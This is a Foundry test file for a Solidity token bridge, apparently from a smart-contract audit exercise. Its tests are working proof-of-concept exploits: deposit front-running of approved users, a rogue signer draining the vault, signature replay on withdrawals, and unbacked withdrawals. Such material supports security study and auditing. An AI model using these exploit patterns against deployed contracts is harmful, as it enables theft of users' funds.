// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import { Ownable } from "openzeppelin/contracts/access/Ownable.sol";
import { Pausable } from "@openzeppelin/contracts/utils/Pausable.sol";
import { L1BossBridge, L1Vault } from "../src/L1BossBridge.sol";
import { IERC20 } from "openzeppelin/contracts/interfaces/IERC20.sol";
import { L1Token } from "../src/L1Token.sol";
import { ERC20Mock } from "openzeppelin/contracts/mocks/token/ERC20Mock.sol";

contract L1BossBridgeTest is Test {
    event Deposit(address from, address to, uint256 amount);

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address userInL2 = makeAddr("userInL2");
    Account operator = makeAccount("operator");
    address attacker = makeAddr("attacker");

    L1Token token;
    L1BossBridge tokenBridge;
    L1Vault vault;

    function setUp() public {
        vm.startPrank(deployer);

        // Deploy token and transfer the user some initial balance
        token = new L1Token();
        token.transfer(address(user), 1000e18);

        // Deploy bridge
        tokenBridge = new L1BossBridge(IERC20(token));
        vault = tokenBridge.vault();

        // Add a new allowed signer to the bridge
        tokenBridge.setSigner(operator.addr, true);

        vm.stopPrank();

        vm.label(user, "user");
        vm.label(deployer, "deployer");
        vm.label(address(token), "token");
        vm.label(address(tokenBridge), "tokenBridge");
        vm.label(address(vault), "vault");
        vm.label(operator.addr, "operator");
        vm.label(attacker, "attacker");
    }

    function test_frontrun() public {
        uint256 approve_amount = 1 ether;
        // 假设当前用户授权
        vm.startPrank(user);
        token.approve(address(tokenBridge), type(uint256).max);
        vm.stopPrank();

        // 攻击者调用deposit函数进行攻击
        vm.startPrank(attacker);
        tokenBridge.depositTokensToL2(user, attacker, approve_amount);
        vm.stopPrank();
    }

    function test_signer_attack() public {
        // 用户存储1 ether到bridge中
        vm.startPrank(user);
        token.approve(address(tokenBridge), 1 ether);
        tokenBridge.depositTokensToL2(user, userInL2, 1 ether);
        vm.stopPrank();

        // 签名者作恶
        vm.startPrank(operator.addr);
        // 签名者首先调用Vault的approveTo函数，授权一定额度
        bytes memory data = abi.encodeCall(L1Vault.approveTo, (operator.addr, 1 ether));
        signAndSendToL1(address(vault), 0, data, uint256(operator.key));
        // 接着签名者将资金转移到攻击者的地址
        token.transferFrom(address(vault), operator.addr, 1 ether);
        assertEq(token.balanceOf(operator.addr), 1 ether);
        vm.stopPrank();
    }

    function test_signature_replay() public {
        // 用户存储10 ether到bridge中
        uint256 deposit_amount = 10 ether;
        vm.startPrank(user);
        token.approve(address(tokenBridge), deposit_amount);
        tokenBridge.depositTokensToL2(user, userInL2, deposit_amount);
        vm.stopPrank();

        uint256 user_balance_start = token.balanceOf(user);

        // 用户提取1 ether
        bytes memory data = abi.encodeCall(IERC20.transferFrom, (address(vault), user, 1 ether));

        // 签名者签名
        (uint8 v, bytes32 r, bytes32 s) = sign_once(address(token), 0, data, uint256(operator.key), 1);

        // 用户调用withdrawTokensToL1函数
        vm.startPrank(user);
        tokenBridge.withdrawTokensToL1(user, 1 ether, v, r, s);
        vm.stopPrank();

        /**
         * 重放签名
         */
        vm.roll(block.number + 10);

        vm.startPrank(attacker);
        // 攻击者重复调用使用签名
        tokenBridge.withdrawTokensToL1(user, 1 ether, v, r, s);
        vm.stopPrank();
        uint256 user_balance_end = token.balanceOf(user);

        // 攻击者使得用户被两次提取资金
        assertEq(user_balance_end, user_balance_start + 2 ether);
    }

    function test_withdraw_no_check() public {
        // 用户存储10 ether到bridge中
        uint256 deposit_amount = 10 ether;
        vm.startPrank(user);
        token.approve(address(tokenBridge), deposit_amount);
        tokenBridge.depositTokensToL2(user, userInL2, deposit_amount);
        vm.stopPrank();

        // 而后，攻击者也存储一定量的token到bridge中
        deal(address(token), attacker, 1);
        vm.startPrank(attacker);
        token.approve(address(tokenBridge), 1);
        tokenBridge.depositTokensToL2(attacker, makeAddr("attacker_in_L2"), 1);
        vm.stopPrank();

        // 攻击者提取 10 ether
        bytes memory data = abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, 10 ether));
        // 注意：签名者无法验证用户是否真正存储了这么多token
        (uint8 v, bytes32 r, bytes32 s) = sign_once(address(token), 0, data, uint256(operator.key), 1);
        vm.startPrank(attacker);
        // 攻击者使用签名提取10 ether
        tokenBridge.withdrawTokensToL1(attacker, 10 ether, v, r, s);
        vm.stopPrank();
        assertEq(token.balanceOf(attacker), 10 ether);
    }

    /**
     *  辅助函数
     */
    function signAndSendToL1(
        address target, // 调用的目标合约
        uint256 value, // 发送的ETH数量
        bytes memory data, // 调用的数据
        uint256 privateKey // 签名者的私钥
    )
        public
        returns (bool)
    {
        // 1. 构造 message
        bytes memory message = abi.encode(target, value, data);

        // 2. 计算 message 的哈希
        bytes32 messageHash = keccak256(message);

        // 3. 转换为以太坊签名消息格式
        bytes32 ethSignedMessageHash = MessageHashUtils.toEthSignedMessageHash(messageHash);

        // 4. 使用私钥进行签名
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, ethSignedMessageHash);

        // 5. 调用 sendToL1 函数
        try tokenBridge.sendToL1(v, r, s, message) {
            return true;
        } catch {
            return false;
        }
    }

    function sign_once(
        address target, // 调用的目标合约
        uint256 value, // 发送的ETH数量
        bytes memory data, // 调用的数据
        uint256 privateKey, // 签名者的私钥
        uint256 nonce // 签名者的nonce
    )
        public
        returns (uint8 v, bytes32 r, bytes32 s)
    {
        // 1. 构造 message
        bytes memory message = abi.encode(target, value, data, nonce);

        // 2. 计算 message 的哈希
        bytes32 messageHash = keccak256(message);

        // 3. 转换为以太坊签名消息格式
        bytes32 ethSignedMessageHash = MessageHashUtils.toEthSignedMessageHash(messageHash);

        // 4. 使用私钥进行签名
        (v, r, s) = vm.sign(privateKey, ethSignedMessageHash);
    }
}
